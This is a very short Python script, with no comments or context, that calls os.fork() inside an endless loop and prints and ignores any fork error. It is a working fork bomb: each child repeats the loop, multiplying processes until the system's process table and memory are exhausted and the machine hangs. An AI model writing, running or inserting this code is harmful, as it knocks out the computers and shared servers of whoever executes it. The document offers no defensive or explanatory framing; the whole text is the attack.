import os

while True:
    try:
        os.fork()
    except Exception as e:
        print(f'os fork error: {e}')